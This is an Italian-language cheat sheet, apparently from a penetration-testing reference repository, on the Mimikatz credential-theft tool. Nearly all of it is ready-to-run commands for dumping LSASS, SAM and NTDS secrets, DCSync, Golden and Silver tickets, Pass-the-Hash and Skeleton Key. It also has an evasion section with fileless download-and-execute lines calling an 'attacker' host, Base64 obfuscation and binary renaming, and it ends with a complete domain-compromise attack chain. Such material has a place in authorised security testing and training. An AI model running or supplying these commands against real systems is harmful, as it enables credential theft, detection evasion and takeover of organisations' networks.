# 🔑 Mimikatz - Scheda di riferimento completa

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
  ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
  ██╔████╔██║██║██╔████╔██║██║█████╔╝ ███████║   ██║   ███████╗
  ██║╚██╔╝██║██║██║╚██╔╝██║██║██╔═██╗ ██╔══██║   ██║   ╚════██║
  ██║ ╚═╝ ██║██║██║ ╚═╝ ██║██║██║  ██╗██║  ██║   ██║   ███████║
  ╚═╝     ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
               Strumento per estrarre le credenziali Windows
```

<p align="center">
  <img src="https://img.shields.io/badge/Mimikatz-Post_Exploitation-red?style=for-the-badge" alt="Mimikatz">
  <img src="https://img.shields.io/badge/Windows-Credentials-blue?style=for-the-badge" alt="Credenziali">
  <img src="https://img.shields.io/badge/Active_Directory-orange?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/Kerberos-green?style=for-the-badge" alt="Kerberos">
</p>

<p align="center">
  <b>🔓 Uno strumento potente per estrarre le credenziali di Windows</b>
</p>

> **Nota sugli esempi originali:** `privilege::debug` abilita un privilegio, mentre `token::elevate` impersona un token: non abilita automaticamente tutti i privilegi. Le password in chiaro dipendono dai provider e dalle protezioni. Un errore di acquisizione LSA non prova da solo la presenza di Credential Guard; DCSync richiede diritti di replica ed è un’operazione di dominio distinta, non un bypass diretto della protezione locale ([Microsoft Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works)). `lsadump::lsa /patch` e `/inject` non equivalgono all’esportazione completa del file NTDS.dit. Nel Golden Ticket, RID 500 identifica l’account Administrator, non un gruppo; `/sids` non seleziona il controller di dominio. Gli esempi con utenti fittizi e chiavi RC4 sono storici e dipendono dalla configurazione e dagli aggiornamenti. I comandi originali restano invariati.

---

## 📋 Indice

- [Che cos'è Mimikatz](#-che-cosè-mimikatz)
- [Per iniziare](#-per-iniziare)
- [Metodi di esecuzione](#-metodi-di-esecuzione)
- [Moduli principali](#-moduli-principali)
- [Estrazione delle credenziali](#-estrazione-delle-credenziali)
- [Attacchi a Kerberos](#-attacchi-a-kerberos)
- [Attacchi avanzati](#-attacchi-avanzati)
- [Tecniche di elusione](#-tecniche-di-elusione)
- [Riferimento rapido](#-riferimento-rapido)

---

## 🎯 Che cos'è Mimikatz

**Mimikatz** è uno strumento di post-exploitation creato da **Benjamin Delpy** (@gentilkiwi) che consente di estrarre:

- 🔑 **Password in chiaro** dalla memoria di Windows (LSASS)
- 🎫 **Ticket Kerberos** (TGT, TGS)
- 🔐 **Hash NTLM** da SAM/NTDS
- 📜 **Certificati** e chiavi private
- 🗝️ **Credenziali memorizzate nella cache**
- 🔒 **Segreti DPAPI**

### Perché è importante?

| Caso d'uso | Descrizione |
|----------|-------------|
| **Furto di credenziali** | Estrazione delle password dalla memoria |
| **Movimento laterale** | Pass-the-Hash, Pass-the-Ticket |
| **Escalation dei privilegi** | Impersonificazione degli utenti |
| **Persistenza** | Golden/Silver Tickets |
| **Controllo del dominio** | DCSync per compromettere l'intero ambiente AD |

---

## 🚀 Per iniziare

### Download

```bash
# Repository ufficiale
git clone https://github.com/gentilkiwi/mimikatz.git

# Binari precompilati (release)
# https://github.com/gentilkiwi/mimikatz/releases
```

### Prerequisiti

- Privilegi di **amministratore/SYSTEM** (per la maggior parte delle funzioni)
- **SeDebugPrivilege** (per l'accesso a LSASS)
- Windows x64 oppure x86

### Primi comandi

```cmd
# Avvia mimikatz
mimikatz.exe

# Verifica i privilegi
mimikatz # privilege::debug
Privilege '20' OK

# Abilita tutti i privilegi
mimikatz # token::elevate

# Esci
mimikatz # exit
```

---

## 💻 Metodi di esecuzione

### 1. Binario autonomo

```cmd
# Esecuzione diretta (rilevata dagli antivirus)
mimikatz.exe

# Comando su una sola riga
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Salva l'output in un file
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# Con il comando log
mimikatz.exe "log output.log" "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### 2. PowerShell (Invoke-Mimikatz)

```powershell
# Scarica ed esegui in memoria (fileless)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Estrai le credenziali
Invoke-Mimikatz -DumpCreds

# Estrai i certificati
Invoke-Mimikatz -DumpCerts

# Esegui su una macchina remota
Invoke-Mimikatz -ComputerName DC01
```

### 3. Metasploit (Kiwi)

```bash
# Nella sessione meterpreter
meterpreter > load kiwi

# Visualizza la guida
meterpreter > help kiwi

# Estrai tutte le credenziali
meterpreter > creds_all

# Estrai gli hash
meterpreter > lsa_dump_sam

# Estrai i segreti
meterpreter > lsa_dump_secrets

# Ticket Kerberos
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
```

### 4. CrackMapExec

```bash
# Estrai SAM
crackmapexec smb 192.168.1.0/24 -u admin -p password --sam

# Estrai LSA
crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa

# Estrai NTDS
crackmapexec smb dc01.domain.local -u admin -p password --ntds
```

### 5. Da un'immagine della memoria

```cmd
# Estrai LSASS tramite Gestione attività oppure procdump
procdump.exe -ma lsass.exe lsass.dmp

# Carica l'immagine della memoria in mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## 🔧 Moduli principali

### Panoramica dei moduli

| Modulo | Descrizione |
|--------|-------------|
| **sekurlsa** | Estrae le credenziali dalla memoria di LSASS |
| **lsadump** | Estrae SAM, NTDS, segreti e cache |
| **kerberos** | Manipolazione dei ticket Kerberos |
| **crypto** | Certificati CryptoAPI |
| **vault** | Windows Vault (gestione credenziali) |
| **token** | Manipolazione dei token |
| **privilege** | Manipolazione dei privilegi |
| **process** | Manipolazione dei processi |
| **service** | Manipolazione dei servizi |
| **dpapi** | Segreti DPAPI |
| **misc** | Comandi vari |

### Accesso alla guida

```cmd
# Elenca tutti i moduli
mimikatz # ::

# Guida del modulo
mimikatz # sekurlsa::
mimikatz # lsadump::
mimikatz # kerberos::
```

---

## 🔐 Estrazione delle credenziali

### Modulo sekurlsa (LSASS)

```cmd
# Abilita prima il privilegio di debug!
mimikatz # privilege::debug

# Estrai tutte le password di accesso (in chiaro, NTLM, SHA1)
mimikatz # sekurlsa::logonpasswords

# Estrai soltanto gli hash NTLM
mimikatz # sekurlsa::msv

# Estrai i ticket Kerberos
mimikatz # sekurlsa::tickets

# Estrai le credenziali WDigest (in chiaro se abilitato)
mimikatz # sekurlsa::wdigest

# Estrai le chiavi di cifratura Kerberos
mimikatz # sekurlsa::ekeys

# Estrai le credenziali DPAPI
mimikatz # sekurlsa::dpapi

# Estrai le credenziali di un processo specifico
mimikatz # sekurlsa::logonpasswords /process:lsass.exe

# Estrai le credenziali TsPkg (RDP)
mimikatz # sekurlsa::tspkg

# Estrai le credenziali LiveSSP
mimikatz # sekurlsa::livessp

# Estrai le credenziali SSP
mimikatz # sekurlsa::ssp

# Estrai le credenziali CloudAP (Azure AD)
mimikatz # sekurlsa::cloudap
```

### Modulo lsadump (SAM/NTDS)

```cmd
# Estrai il database SAM (account locali)
mimikatz # lsadump::sam

# Estrai SAM con l'hive SYSTEM
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM

# Estrai i segreti LSA
mimikatz # lsadump::secrets

# Estrai le credenziali nella cache (DCC2)
mimikatz # lsadump::cache

# DCSync (replica del controller di dominio)
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Estrai NTDS.dit (controller di dominio)
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::lsa /inject

# Estrai le chiavi delle relazioni di trust
mimikatz # lsadump::trust /patch

# Estrai le chiavi di backup (DPAPI)
mimikatz # lsadump::backupkeys /system:dc01.domain.local /export
```

### Modulo vault (Gestione credenziali)

```cmd
# Elenca le credenziali del vault
mimikatz # vault::list

# Estrai le credenziali del vault
mimikatz # vault::cred /patch
```

### Modulo dpapi

```cmd
# Estrai le chiavi master DPAPI
mimikatz # dpapi::masterkey /in:masterkey_file /sid:user_sid /password:password

# Decifra un blob DPAPI
mimikatz # dpapi::blob /in:blob_file /masterkey:key

# Password di Chrome
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---

## 🎫 Attacchi a Kerberos

### Visualizzazione dei ticket

```cmd
# Elenca tutti i ticket
mimikatz # kerberos::list

# Elenca i ticket con dettagli
mimikatz # kerberos::list /export

# Esporta tutti i ticket
mimikatz # sekurlsa::tickets /export
```

### Pass-the-Ticket (PtT)

```cmd
# Rimuovi i ticket esistenti
mimikatz # kerberos::purge

# Importa un ticket
mimikatz # kerberos::ptt ticket.kirbi

# Verifica il ticket
mimikatz # kerberos::list
```

### Golden Ticket (persistenza come amministratore di dominio)

```cmd
# Prerequisiti:
# - Nome del dominio (domain.local)
# - SID del dominio (S-1-5-21-...)
# - Hash NTLM di krbtgt
# - Nome utente bersaglio (può essere fittizio nell'esempio originale)

# Crea un Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# Crea ed esporta
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# Con gruppi specifici (nell'originale: RID 500 = Admin, 512 = Domain Admins, ecc.)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# Con il controller di dominio bersaglio
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

### Silver Ticket (specifico per il servizio)

```cmd
# Prerequisiti:
# - Nome del dominio
# - SID del dominio
# - Hash NTLM dell'account del servizio bersaglio
# - SPN del servizio

# Crea un Silver Ticket per CIFS (condivisioni di file)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:service_hash /ptt

# Silver Ticket per HTTP (web)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:web.domain.local /service:http /rc4:hash /ptt

# Silver Ticket per SQL
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:sql.domain.local /service:MSSQLSvc /rc4:hash /ptt

# Silver Ticket per WinRM/PSRemoting
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:http /rc4:hash /ptt
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:wsman /rc4:hash /ptt
```

---

## 💀 Attacchi avanzati

### Pass-the-Hash (PtH)

```cmd
# Esegui un comando come un utente con il suo hash NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Con chiavi AES
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:aes_key /run:powershell.exe

# PtH per avviare un processo
mimikatz # sekurlsa::pth /user:admin /domain:. /ntlm:hash /run:"powershell -ep bypass"
```

### Overpass-the-Hash (Pass-the-Key)

```cmd
# Conversione da NTLM a ticket Kerberos
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:cmd.exe

# Poi richiedi un TGT
# klist dovrebbe mostrare il ticket Kerberos
```

### Attacco DCSync

```cmd
# Replica un singolo utente
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# Replica krbtgt (per un Golden Ticket)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Replica tutti gli utenti
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# Replica tramite un controller di dominio specifico
mimikatz # lsadump::dcsync /domain:domain.local /dc:DC01.domain.local /user:Administrator
```

### Skeleton Key

```cmd
# Inietta la skeleton key in LSASS del controller di dominio (tutti gli utenti possono autenticarsi con "mimikatz")
mimikatz # misc::skeleton

# Persistenza fino al riavvio del controller di dominio
# Accesso con qualsiasi utente: password = mimikatz
```

### Abuso di DPAPI

```cmd
# Estrai le chiavi master
mimikatz # sekurlsa::dpapi

# Decifra un file di credenziali
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\xxx /masterkey:key

# Password RDP salvate
mimikatz # dpapi::rdg /in:rdp_file.rdg /masterkey:key
```

### Manipolazione dei token

```cmd
# Elenca i token
mimikatz # token::list

# Eleva a SYSTEM
mimikatz # token::elevate

# Eleva a un utente specifico
mimikatz # token::elevate /user:Administrator

# Ripristina il token originale
mimikatz # token::revert

# Esegui come un utente specifico
mimikatz # token::run /user:domain\admin
```

---

## 🛡 Tecniche di elusione

### Nomi offuscati

```cmd
# Rinomina mimikatz.exe
rename mimikatz.exe m.exe
rename mimikatz.exe totally_legit.exe
```

### Offuscamento di PowerShell

```powershell
# Codifica Base64
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded
```

### Esecuzione soltanto in memoria

```powershell
# Invoke-Mimikatz (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# Oppure utilizza kiwi di meterpreter
meterpreter > load kiwi
meterpreter > creds_all
```

### Alternative per estrarre la memoria di LSASS

```cmd
# Procdump (firmato da Microsoft)
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll (integrata)
rundll32.exe comsvcs.dll, MiniDump <lsass_pid> dump.dmp full

# Gestione attività (interfaccia grafica)
# Clic destro su lsass.exe > Crea file dump

# SQLDumper (da SQL Server)
sqldumper.exe <lsass_pid> 0 0x01100
```

### Aggiramento di Credential Guard

```cmd
# Verifica se Credential Guard è abilitato
mimikatz # sekurlsa::logonpasswords
# Mostrerà "ERROR kuhl_m_sekurlsa_acquireLSA"

# Alternativa: utilizza DCSync
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## 📊 Riferimento rapido

### Comandi essenziali su una riga

```cmd
# Estrai tutte le credenziali
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Estrai SAM
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# DCSync di tutti gli account
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /all /csv" "exit"

# Golden Ticket
mimikatz.exe "privilege::debug" "kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ptt" "exit"

# Pass-the-Hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe" "exit"
```

### Riferimento rapido dei moduli

| Comando | Descrizione |
|---------|-------------|
| `privilege::debug` | Abilita il privilegio di debug |
| `token::elevate` | Eleva a SYSTEM |
| `sekurlsa::logonpasswords` | Estrai tutte le credenziali da LSASS |
| `sekurlsa::msv` | Estrai gli hash NTLM |
| `sekurlsa::tickets` | Estrai i ticket Kerberos |
| `sekurlsa::pth` | Pass-the-Hash |
| `lsadump::sam` | Estrai il database SAM |
| `lsadump::secrets` | Estrai i segreti LSA |
| `lsadump::dcsync` | Attacco DCSync |
| `lsadump::lsa /patch` | Estrai NTDS dal controller di dominio |
| `kerberos::list` | Elenca i ticket Kerberos |
| `kerberos::ptt` | Pass-the-Ticket |
| `kerberos::golden` | Crea un Golden/Silver Ticket |
| `kerberos::purge` | Rimuovi i ticket |
| `vault::list` | Elenca le credenziali del vault |
| `dpapi::cred` | Decifra le credenziali DPAPI |

### Esempio di catena di attacco

```
1. Ottieni l’accesso iniziale
2. privilege::debug
3. sekurlsa::logonpasswords (ottieni le credenziali)
4. sekurlsa::pth (movimento laterale)
5. lsadump::dcsync /user:krbtgt (ottieni l’hash di krbtgt)
6. kerberos::golden (crea un Golden Ticket)
7. Compromissione completa del dominio!
```

---

## 📚 Risorse

- [GitHub ufficiale](https://github.com/gentilkiwi/mimikatz)
- [Wiki di Mimikatz](https://github.com/gentilkiwi/mimikatz/wiki)
- [Guida Mimikatz di ADSecurity](https://adsecurity.org/?page_id=1821)
- [Mimikatz su HackTricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

### Schede di riferimento correlate
- [Escalation dei privilegi Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.it.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.it.md)

---

<p align="center">
  <b>🔑 Padroneggia gli attacchi alle credenziali Windows!</b><br>
  <i>Mimikatz - Il coltellino svizzero per Windows</i>
</p>
